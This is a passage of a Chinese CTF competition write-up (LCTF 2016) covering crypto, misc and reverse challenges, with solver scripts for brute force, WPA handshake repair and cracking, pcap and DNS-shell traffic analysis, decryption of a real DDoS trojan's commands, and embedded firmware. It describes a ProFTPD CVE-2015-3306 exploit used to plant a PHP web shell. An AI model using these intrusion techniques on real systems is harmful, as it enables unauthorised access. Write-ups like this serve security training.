47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177114900132898945572068297162714907204040L, 47151187630170508946550590940497421816323570626342529264695210340018989341227979713866943813866053413150335084934817107617993172782066024755642911882059190347569889101139210027601350765558686021652374574364157734035825031651335006681991745326523882879567488679550114398601894015152212989669287744229828109313772135492989363845359569577930002703168580012177024614659746333751944013277918979979452838910451314830517626226812111086617001446819759278727669699433710723965740498925499287801336151510037755053019684620660717114330472099865458814571094207720509115863001849254027733865594330714620127867103989520820147652839911441693648565908877821604091210108678987867242564251709096595005423318352932402719925534847930784847299511987496721904066523578263274498793322917788336595457279846976363887848066280738155134219879078067684956409012070198076296654028153831098694860754975328932529207057974618110712280934666664728972656076484522040533059678936174289345253777045003597312000627579157387613037538709979271187902698911832876797141724749720913114489026277701176857072667073091116052491281774213875710421731415977953374297574181411476522002777637311080653697834289305316477478889515245281489854177021915162579455595532972926008542466995L]
    for e in esign:
        tmp += hex((e%x))[2:-1].decode('hex')
    print tmp

爆破脚本：

    
    
    from Crypto.Hash import SHA256
    from Crypto.Hash import SHA512
    from time import time
    import string
    rang = string.letters[:26]+string.digits+'_'
    m='p1eas3_b00m_me__b0om_shak4l4ka_1am_flag'
    flag1 = 'p1eas3_b00m_'
    flag2 = '__b0om_shak4l4ka_1am_'
    h = 'b96648cc3f097c6faf581386b97d7e043521abe2369d1141d9a98d4897770ea7'
    z= time()
    for a in rang:
        for b in rang:
            for c in rang:
                for d in rang:
                    for e in rang:
                        for f in rang:
                            if SHA256.new(flag1+a+b+flag2+c+d+e+f).hexdigest() == h:
                                print flag1+a+b+flag2+c+d+e+f
    print time() - z

  

**misc 150**

首先，我们解压得到一个Misc150.txt文件。这里必须使用Winrar解压，因为其中存在文件流数据。这一点在txt文件以及压缩包大小不一致中也可以看得出来。Misc150.txt中说道
Flag.zip behind me. 暗示着文件流的存在，以及流名称为Flag.zip。我们就使用命令行来访问文件流。

>"C:Program FilesWinRARwinrar.exe" Misc150.txt:Flag.zip

打开压缩包，得到一个小压缩包一个图片。其中，小压缩包名字为Steins;Gate也就是命运石之门的名字。而图片的Christina则是命运石的女主角。在题目的描述中，有说道“命运石之门里没有flag”，这也就暗示着flag不在这两文件里面。这样我们剩下的选择就只有当前这个zip文件了。如果细心的话，会发现压缩包的注释部分有非常长条的空白行，将其三行复制出来，tab用1替换，空格用0替换就可以得到一串二进制。简单判断二进制应为7为ASCII码，解码得flag。

另一种方法是通过Ultra edit等软件，查看包数据也能发现问题。在这一部分有规律的 **0x09** ， **0x20**
，将其提取出来，替换一下也能得到flag。

**  
**

**misc 300**

拿到流量包，分析可知有两次wpa握手的过程，连接的同一个wifi。第二次握手过程中wireshark根据标志位识别出来的顺序颠倒了，说明握手包有问题。根据wpa认证过程，修改Key
Information字段，得到修复的包。然后扔到aircrack去跑，在有hint的情况下三个小时之内能跑出来，得到密码：55672627，然后airdecap解包。本来以为不会有大佬注意到这是被打掉了强制重新连得，没想到大佬们注意到了好细心Orz。

tips：应该先爆破再修复和先修复再爆破是不一定的，aircrack如果不修复就爆破是爆破不出来的，有的工具是通过第一次认证破解的，有的工具通过第二次认证破解，如果不修复的话跑出来与否就看用的啥了，通过第二次认证跑的肯定不修复出不来结果。

总之最后得到通信内容：

一个文件需要逆向分析：re2

一个ip和端口：119.28.62.216:3333

re2源码：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
    void readFlag()
    {
        FILE *pFile=fopen("./flag.txt","r");
        char pBuf[32]={0};//socat tcp-l:8000,reuseaddr,fork exec:./re2
        fread(pBuf,1,32,pFile);
        printf("%s",pBuf);
        fclose(pFile);
    }
    int main()
    {
        int i,j;
        int a[19*19] = {0};
        int b[19][19];
        int k;
        setvbuf(stdout, 0, 2, 0);
        setvbuf(stdin, 0, 2, 0);
        for (k = 1; k <=19 ; k=k+2)
        {
            for (i = 0; i < k; ++i)
            {
                for (j = 0; j < k; ++j)
                {
                    scanf("%d",&b[i][j]);
                    a[(b[i][j]-1)%(k*k)] = 1;
                }
            }
            for (i = 0; i < k*k; ++i)
            {
                if(a[i]==0)
                    return -1;
            }
            int num;
            srand(time(NULL));
            num = rand()%k;
            int c1=0,c2=0,c3=0,c4=0;
            for (i = 0; i < k; ++i)
            {
                c1 += b[num][i];
            }
            for (i = 0; i < k; ++i)
            {
                c2 += b[i][num];
            }
            for (i = 0; i < k; ++i)
            {
                for (j = 0; j < k; ++j)
                {
                    if(i==j) c3 += b[i][j];
                    if (i+j==k-1) c4+=b[i][j];
                }
            }
            if (c1 != c2 || c3 != c4 || c1 != c3)
                return -1;
        }
        readFlag();
        return 0;
    }

编写程序并提交结果：

    
    
    #include  <stdio.h>
    #include  <stdlib.h>
    #define   MAXSIZE   20
    int main()
    {
         int  matrix[MAXSIZE][MAXSIZE]; /* the magic square   */
         int  count;                    /* 1..n*n counting    */
         int  row;                      /* row index          */
         int  column;                   /* column index       */
         int  order;                    /* input order        */
         char line[100];
         for (order = 1; order <= 19; order += 2)
         {
              row    = 0;         /* start of from the middle */
              column = order/2;   /* of the first row.        */
              for (count = 1; count <= order*order; count++) {
                   matrix[row][column] = count; /* put next # */
                   if (count % order == 0)  /* move down ?    */
                        row++;    /* YES, move down one row   */
                   else {         /* compute next indices     */
                        row    = (row == 0) ? order - 1 : row - 1;
                        column = (column == order-1) ? 0 : column + 1;
                   }
              }
              for (row = 0; row < order; row++) {
                   for (column = 0; column < order; column++)
                        printf("%d ", matrix[row][column]);
              }
              printf("n");
         }
         return 0;
    }

  

**misc 400**

扫端口和ftp登陆尝试的流量都没啥用。。。

利用proftp的洞：CVE2015-3306，获得了192.168.138.136的shell，写到web目录下一个1.php一句话。然后通过另外一台机器连菜刀，down下来了两个文件：xor.jpg和whoami.jpg。名字提示很明显，xor，没有挖坑，所以两个文件xor一下得到可运行的python代码，逆向这段代码可获得AES_KEY{}。话说为什么会有人提交这个东西呢……明显格式不对啊……

proftpd漏洞利用流量：

然后取得msfshell：

利用msfshell写菜刀一句话：

菜刀连接下载文件，菜刀流量的话，去掉文件头和文件尾的东西就ok了：

图片解密python脚本：

    
    
    with open("whoami.jpg",'r') as file:
      pic=file.read()
    temp=''
    with open('xor.jpg','r') as file:
      t=file.read()
      for a,b in zip(t,pic):
        print chr(ord(a)^ord(b)),
    m="cc90b9054ca67557813694276ab54c67aa93092ec87dd7b539"
    def process(a,b,m):
      return "".join(map(chr,map(lambda x: (x*a+b)%251,map(ord,m.decode('hex')))))
    for i in xrange(255):
      for j in xrange(255):
        if "AES" in process(i,j,m):
          print process(i,j,m)

得到AES_key{}，AES啊！不是LCTF！

然后DNS流量异常，找了个DNSshell不能用啊，于是自己xjb写了一个xjb传的shell。发一个baidu.com的开始接收命令，一个命令执行传回去一个google.com。找到这些返回google.com的蜜汁流量，拼到一起用AES_key解密就可以看到：

混进去了一堆xjb访问的http流量，访问了L-team.org的about页面，发现DNS解析了不少dalao博客的地址，就当广告了233333：

最后，解密得到Please submit the used ftp CVE ID like "CVE********"and
LCTF{A11_1n_0ne_Pcap} as your flag.eg."CVE12345678A11_1n_0ne_Pcap"

**  
**

**Reverse**

**Re100**

re100设计之初就是消耗耐心的逆向，并没有什么有趣的东西在里面，所以最后的排序函数也只是烂代码增加难度系列(不要打我)。此外Re100最后的排序算法出了一点小问题，需要选手用暴力搜索来解出这道题，不过对题目整体设计没有影响。

算法主体是CBC+字符串排序。外围是Qt的信号槽机制。

排序函数：

    
    
    for(QVector<int>::iterator iter = pd.begin(); iter != pd.end(); ++iter){
            num = *iter;
            num = num % key.size();
            while(randlist.indexOf(num) != -1){
                num = (num + 1) % pd.size();
            }
            randlist.append(num);
        }
        void Randlist::randpd(QVector<int> &pd){
            int idlist;
            int begin_index = 0;
            int idpd = begin_index;
            do{
                idlist = randlist.indexOf(idpd);
                std::swap(pd[idlist], pd[begin_index]);
                idpd = idlist;
            }while(idpd != begin_index);
        }

程序流程是，获取输入后先用x09补全长度到5的倍数。之后是CBC加密，这里没有使用初始IV。key="Cirno"，5个字符一组，先和将每一个字符的高4位和低4位交换，再和key异或。除第一组外每组再和前一组异或。最后使用上面的代码和最初(补全后)的输入生成奇怪的位置字典，重排CBC后的字串，进行`strcmp`。

**Re200**

re200是一个完(zhi)整(zhang)的文件加密器。当然，解密器我没有写。这题本来是想玩SMC的…但是后来发现写好的SMC对逆向无任何干扰，反而是signal坑了不少人。

程序在main函数执行前(init)先运行了sub_8048901，用sig ==
ppid检测了是否被调试，如果是的话就直接将一个后面用到的表填充为错误数值。之后是取得分页大小，将sub_8048AC3所在的内存设置为RWX。最后设置signal(SIGUSR1,
sub_80489FB)。以上这些除了sysconf()，都是int 0x80实现的。

main函数执行，再一次检测是否有调试(有的话直接exit)，获得用户输入，补全为偶数长度，拷贝字符串到全局变量，然后用kill(0,
SIGUSR1)触发了之前设置的signal，跳转到sub_80489FB。将补全后的字符串分为两个一组，循环调用sub_8048A7B。在sub_8048A7B中根据((a>>2)&0x3)和之前的表得到一个函数地址，调用sub_8048AC3。

sub_8048AC3在初始化时被设置为RWX…利用sub_8048A7B中的函数地址进行SMC，跳转到取得的函数中。在之后的函数就是对这组字符的移位和异或加密。

signal处理完成，回到正常流程中，再再一次检测是否有调试(出题人:求不打)。对加密完的字串做base16。最后用维吉尼亚算法加密文件，输出。

解题时，维吉尼亚直接在线解密就可以，然后得到key.明文是小说《基督山伯爵》里面随意选的一段话，只是为了帮助进行维吉尼亚解密，并没有实际意义。解密得到key后，程序就和一个crackme没什么区别了…分析算法逆出orignal
key即可。测试时是正向暴力破解，反推也没问题。

orignal key = H4ck1ngT0TheGate

此外：

main函数的前后分别会执行init和finit。本题源码中的init声明如下

    
    
    void init_game(void) __attribute__((constructor));

objdump和gdb分析ELF时都需要Section header table，但是ELF文件的执行只需要Program header
table。程序编译完之后直接覆盖了Section header table，导致gdb直接GG。但是对IDA无效。section header
table也是可以重建的，但是…之后还是有反调试拦着(逃)。

因为char类型的符号问题，在逆推时会有点小问题。但是这并不重要…逆推也是可解的。

测试脚本：

    
    
    char *strkey = "ieedcpgdhkedddfenkfaifgggcgbbbgf";
        char all_a;
        char all_b;
        int main(int argc, char const *argv[])
        {
            boom();
            return 0;
        }
        void zero(){
            char c;
            //c = a
            c = (all_a & 0xF0) | (all_b & 0x0F);
            all_b = (all_a & 0x0F) | (all_b & 0xF0);
            all_a = c;
            all_a = all_a ^ 0x99;
            all_b = all_b ^ 0x55;
        }
        void one(){
            all_a = all_a ^ all_b;
            all_b = ((all_b >> 4) & 0x0F) | ((all_b << 4) & 0xF0);
        }
        void two(){
            //c = a
            char c;
            c = (all_a & 0x0F) | (((all_b & 0x0F) << 4) & 0xF0);
            all_b = ((all_a >> 4) & 0x0F) | (all_b & 0xF0);
            all_a = c;
        }
        void three(){
            //and 0xF0 ?
            all_a = all_a ^ (all_a << 4);
            all_b = all_b ^ (all_b << 4);
        }
        void boom(){
            char end[16];
            int map; 
            int a, b, i;
            char tmp_1, tmp_2;
            char end_1, end_2, end_3, end_4;
            for(i = 0; i < 32; i+=4){
                printf("Num %d and %d:n", i, i+1);
                for(a = 0; a <= 0xFF; ++a){
                    for(b = 0; b <= 0xFF; ++b){
                        all_a = a;
                        all_b = b;
                        map = (a >> 2) & 0x3;
                        switch(map){
                            case 0: zero();break;
                            case 1: one();break;
                            case 2: two();break;
                            case 3: three();break;
                        }
                        tmp_1 = all_a;
                        tmp_2 = all_b;
                        end_1 = (tmp_1 & 0x0F) + 0x61;
                        end_2 = ((tmp_1 >> 4) & 0x0F) + 0x61;
                        end_3 = (tmp_2 & 0x0F) + 0x61;
                        end_4 = ((tmp_2 >> 4) & 0x0F) + 0x61;
                        if((end_1 == strkey[i]) && (end_2 == strkey[i+1]) && (end_3 == strkey[i+2]) && (end_4 == strkey[i+3])){
                            printf("%c%cn", a, b);
                        }    
                    }
                }
            }
        }

  

**Re300**

Re300原本的出题人跑路了，我临时帮他出题。随手找了个DDoS木马。本着不互相伤害的原则。没有用MIPS版本，没有去掉符号表。所以就很easy了。

首先，题目提供一个ELF可执行文件（re300）和抓的包（dump.pcap）。提示信息flag(ip:port)，那自然是找被打的ip和端口号了。关于此马的详细分析可参考
<https://www.sans.org/reading-room/whitepapers/malicious/analyzing-backdoor-bot-mips-platform-35902R_y_RQ>因为使用AES加密数据包，遂家族命名为AES.DDoS。本样本产自China的变种台风ddos，支持多平台MIPS，Windows，Linux等。

首先观察数据包，就那么几条。显然C&C IP为192.168.168.133，上线端口48080，而Victim IP
为192.168.168.148（由第4个数据包可以确定）。那么可以确定第16个数据包，为中控IP像肉鸡发送的指令包。

懂得人自然懂。数据包的格式一般为【指令号+数据内容】在`_ConnectServerA`函数里，106行接收buffer，前4个字节表示指令号，当其为6时（118行），执行
**DealwithDDoS** :

ok，接下来我们可以发现程序使用AES算法开始解密，同时注意到数据包中存在重复的数据`7df76b0c1ab899b33e42f047b91b546f`，很容易联想到分组加密的ECB（电码本）模式，并且分组长度是16，这点从key0也可以辅证。

由此我们可以解密出数据包。接下来就是找到数据包中表示ip和port的字段。这个看一下DealwithDDoS（128行）这个函数。数据包的偏移位置0x184表示attackMode(SYN,TCP,UDP…)，那0x188处就是轮数了吧。

随便挑一个mode跟进，SYN_Flood函数。40行和41行分别取出port，ip。至此，题目想要的数据已经分析出来了。

最后就是写脚本啦：

    
    
    from Crypto.Cipher import AES
    from struct import unpack
    from hashlib import md5
    with open('./re300') as fp:
        fp.seek(0xe81ff)
        key = fp.read(16)
    with open('./dump.pcap') as fp:
        data = fp.read()
        idex = data.find('x06x00x00x00')
        data = data[idex+4:idex+0x1a4]
    aes  = AES.new(key , AES.MODE_ECB)
    text = aes.decrypt(data)
    ip   = text[:text.find('x00')]
    port = unpack('<H',text[0x1d4-0x54:][:2])[0]
    flag = md5(ip+':'+str(port)).hexdigest()
    print 'flag is: {0}'.format(flag)

  

**Re 400**

题目试图用magic_file作为块链数据挖矿，挖到前3400个block之后，用他们的哈希值生成IV和Key，解密Flag字符串。题目除了去除了符号表之外，没有任何反调试和反分析内容，基本就是考察算法逆向能力。题目的一个切入点就是，通过trace可以发现在一系列函数中耗了很长时间，由此可以发现SHA256的相关代码，再分析上下文的代码，也就差不多能看出挖矿的过程了。结合题目前期给出的UID（转换成十进制搜索，可以发现是第一个block的Nonce值），以及后期给出的Bitcoin提示，应该是能明白程序在干什么的。

相关代码已经上传到Github了，这里就不多介绍。

**Re 500**

关于Re500，首先向大家道歉，由于时间关系，出题人手残把SIU_PGPDO和SIU_PGPDI的地址值写反了，比赛结束后有队伍报告了这个问题……

这道题是一个跑在嵌入式设备中的程序，目标芯片是Freescale的MPC5674F，使用了Erika
RTOS。程序原理是，初始化外部的LCD1602，并将flag打印到屏幕上。在设计的时候，我埋下的几个坑点有：

有时候IDA导入时，默认开了VLE，你要自己在导入成功之后去Options里关掉VLE，然后Reanalyze一下（导入的时候关掉VLE是没作用的，不知道是我的使用方法不对还是他自己的bug，有知道的还望指点下）。这个在题目描述里实际也是有的（"I
Hate Change"，VLE是变长指令集）；

无意把寄存器写反，坑了一波……这个真不是有意的……再次向表哥们低头；

有的队伍看到ELF就先去用qemu跑了，这个应该是跑不起来的……用TRACE32应该可以搞，不过未必比静态分析方便；

程序是跑在一个RTOS上的，所以如何把RTOS的代码和业务代码分开，对没有过相关开发或逆向经验的选手可能有点麻烦（不过也完全可以借助FLIRT）；

MCU和外设（LCD1602）的连线采用并行方式，但是D0-D7不是顺序接入的，有三根线被人为调换了位置，意在模拟由于PCB布线或生产问题，导致两个设备之间没办法用连续的一段IO口通信；

没有直接向LCD1602送出字符，而是先把字模写到了`CGRAM`，然后再显示到屏幕上，另外字模的显示字符和对应字母是不一致的，而且先解出来IO口的乱序规则才可以使用字模……；

有三段代码都能和LCD1602通信，但是仔细分析之后可以发现，只有一段代码比较像正确的代码，因为只有那段循环每次都有机会和外设通信，其他的是忽悠你的，毕竟连优先级都没有第一段高；

同样把代码传到了Github上，大家可以自行查阅。

拿到题后先正确的载入到IDA中，然后最简单的方法是直接查看字符串，有一段以FAIL开头的字符串，找到引用函数，然后直接去读。这种方法根本不需要对RTOS和业务代码做区分，比较快。通过向外发送的控制字，以及将数组取出分析，可以知道这应该是在送字模，但是字模是乱掉的。解决办法就是，要么自己根据FLAG格式推测，要么从送控制字之前的几个移位操作分析出硬件连线。

解题脚本如下：

    
    
    #!/usr/bin/python
    srctext="FAIL{tX1NJfGxnatFxY63Wxmlpxh12Z0h5xeGxaH56Nfy}" #get from bin
    charmap={ # get charmap from bin
    0xA9:[0x46, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x46], 
    0xAA:[0x00, 0x00, 0x00, 0x15, 0x15, 0x46, 0x42, 0x42], 
    0xAB:[0x00, 0x00, 0x00, 0x44, 0x03, 0x45, 0x03, 0x45], 
    0xAC:[0x00, 0x00, 0x00, 0x47, 0x02, 0x44, 0x01, 0x47], 
    0xAD:[0x00, 0x00, 0x00, 0x45, 0x03, 0x02, 0x02, 0x45], 
    0xAE:[0x04, 0x06, 0x04, 0x04, 0x04, 0x04, 0x04, 0x46], 
    0xAF:[0x53, 0x53, 0x53, 0x53, 0x15, 0x15, 0x15, 0x15], 
    0xA0:[0x12, 0x02, 0x02, 0x46, 0x03, 0x03, 0x03, 0x46], 
    0xA1:[0x16, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x57], 
    0xA8:[0x46, 0x11, 0x11, 0x40, 0x04, 0x02, 0x10, 0x57], 
    0xF9:[0x00, 0x00, 0x00, 0x44, 0x03, 0x47, 0x02, 0x45], 
    0xFA:[0x00, 0x00, 0x00, 0x56, 0x15, 0x15, 0x15, 0x15], 
    0xFB:[0x46, 0x11, 0x11, 0x46, 0x11, 0x11, 0x11, 0x46], 
    0xFC:[0x13, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x44], 
    0xFD:[0x04, 0x00, 0x00, 0x06, 0x04, 0x04, 0x04, 0x46], 
    0xFE:[0x46, 0x11, 0x01, 0x44, 0x01, 0x01, 0x11, 0x46], 
    0xFF:[0x00, 0x00, 0x00, 0x53, 0x06, 0x02, 0x02, 0x16], 
    0xF0:[0x56, 0x03, 0x03, 0x46, 0x02, 0x02, 0x02, 0x16], 
    0xF1:[0x47, 0x11, 0x10, 0x06, 0x40, 0x01, 0x11, 0x56], 
    0xF2:[0x46, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x46], 
    0xF3:[0x47, 0x40, 0x40, 0x40, 0x40, 0x40, 0x50, 0x16], 
    0xF4:[0x00, 0x00, 0x00, 0x53, 0x03, 0x03, 0x03, 0x45], 
    0xF5:[0x56, 0x03, 0x03, 0x46, 0x03, 0x03, 0x03, 0x56], 
    0xF6:[0x56, 0x03, 0x03, 0x46, 0x42, 0x03, 0x03, 0x17], 
    0xF7:[0x17, 0x03, 0x42, 0x06, 0x42, 0x42, 0x03, 0x17], 
    0xE8:[0x57, 0x50, 0x40, 0x04, 0x04, 0x04, 0x04, 0x04], 
    0xE9:[0x40, 0x00, 0x44, 0x40, 0x40, 0x40, 0x40, 0x16], 
    0xEA:[0x53, 0x03, 0x07, 0x07, 0x43, 0x43, 0x03, 0x17], 
    0xEB:[0x40, 0x44, 0x42, 0x42, 0x50, 0x47, 0x40, 0x41], 
    0xEC:[0x04, 0x04, 0x44, 0x42, 0x42, 0x47, 0x03, 0x13], 
    0xED:[0x00, 0x56, 0x03, 0x03, 0x03, 0x46, 0x02, 0x16], 
    0xEE:[0x00, 0x00, 0x00, 0x47, 0x40, 0x04, 0x04, 0x47], 
    0xEF:[0x45, 0x03, 0x10, 0x10, 0x51, 0x11, 0x03, 0x44], 
    0xE0:[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57], 
    0xE1:[0x56, 0x03, 0x03, 0x03, 0x03, 0x03, 0x03, 0x56], 
    0xE2:[0x57, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x57], 
    0xD9:[0x47, 0x11, 0x10, 0x10, 0x10, 0x10, 0x11, 0x46], 
    0xDA:[0x12, 0x02, 0x02, 0x43, 0x42, 0x46, 0x03, 0x17], 
    0xDB:[0x00, 0x00, 0x00, 0x44, 0x03, 0x03, 0x03, 0x44], 
    0xDC:[0x13, 0x03, 0x03, 0x47, 0x03, 0x03, 0x03, 0x13], 
    0xDD:[0x13, 0x03, 0x03, 0x42, 0x42, 0x44, 0x04, 0x04], 
    0xDE:[0x16, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x57], 
    0xDF:[0x57, 0x10, 0x10, 0x56, 0x01, 0x01, 0x11, 0x46], 
    0xD0:[0x00, 0x00, 0x00, 0x53, 0x42, 0x04, 0x42, 0x53], 
    0xD1:[0x57, 0x15, 0x04, 0x04, 0x04, 0x04, 0x04, 0x46], 
    0xD2:[0x12, 0x02, 0x02, 0x46, 0x03, 0x03, 0x03, 0x17], 
    0xD3:[0x53, 0x42, 0x42, 0x04, 0x04, 0x04, 0x04, 0x46], 
    0xD4:[0x57, 0x03, 0x42, 0x46, 0x42, 0x02, 0x02, 0x16], 
    0xD5:[0x46, 0x11, 0x11, 0x11, 0x47, 0x01, 0x03, 0x46], 
    0xD6:[0x00, 0x04, 0x04, 0x46, 0x04, 0x04, 0x04, 0x41], 
    0xD7:[0x46, 0x50, 0x10, 0x56, 0x11, 0x11, 0x11, 0x46], 
    0xC8:[0x00, 0x45, 0x03, 0x03, 0x03, 0x45, 0x01, 0x41], 
    0xC9:[0x00, 0x17, 0x03, 0x42, 0x44, 0x04, 0x04, 0x12], 
    0xCA:[0x46, 0x11, 0x11, 0x11, 0x17, 0x51, 0x46, 0x41], 
    0xCB:[0x00, 0x00, 0x00, 0x17, 0x03, 0x42, 0x44, 0x04], 
    0xCC:[0x53, 0x42, 0x42, 0x04, 0x04, 0x42, 0x42, 0x53], 
    0xCD:[0x57, 0x50, 0x40, 0x04, 0x04, 0x02, 0x03, 0x57], 
    0xCE:[0x15, 0x15, 0x15, 0x46, 0x42, 0x42, 0x42, 0x42], 
    0xCF:[0x00, 0x45, 0x03, 0x44, 0x02, 0x47, 0x02, 0x45], 
    0xC0:[0x00, 0x00, 0x00, 0x56, 0x03, 0x03, 0x03, 0x17], 
    0xC1:[0x41, 0x04, 0x04, 0x47, 0x04, 0x04, 0x04, 0x47], 
    0xC2:[0x57, 0x03, 0x42, 0x46, 0x42, 0x02, 0x03, 0x57], 
    0xC7:[0x41, 0x01, 0x01, 0x45, 0x03, 0x03, 0x03, 0x45], 
    0xE3:[0x41, 0x40, 0x40, 0x04, 0x40, 0x40, 0x40, 0x41], 
    0xE5:[0x06, 0x04, 0x04, 0x40, 0x04, 0x04, 0x04, 0x06]
    }
    for i in srctext:
        c = list(charmap[0x98^ord(i)])
        c = [0]*(8-len(c))+c
        for r in c:
            if type(r)==str:
                r = ord(r)
            # swap the io line
            r=((r&0b00000001))        |((r&0b00000010)<<2)        |((r&0b00000100))        |((r&0b00001000)>>3)        |((r&0b00010000))        |((r&0b00100000))        |((r&0b01000000)>>5)        |((r&0b10000000))
            # convert to graph
            r = bin(r)[2:]
            r = '0'*(8-len(r))+r
            r = r.replace('0',' ')
            r = r.replace('1','x18')
            print(r)
        input()

**Attachments**

****

1\. Pwn出题人给出的源码：<https://github.com/Ic3makr/pwnable-solutions/tree/master/L-ctf-2016>

2\. Re400、500的源码：<https://github.com/SilverBut/2016CM>

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84679](/post/id/84679)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

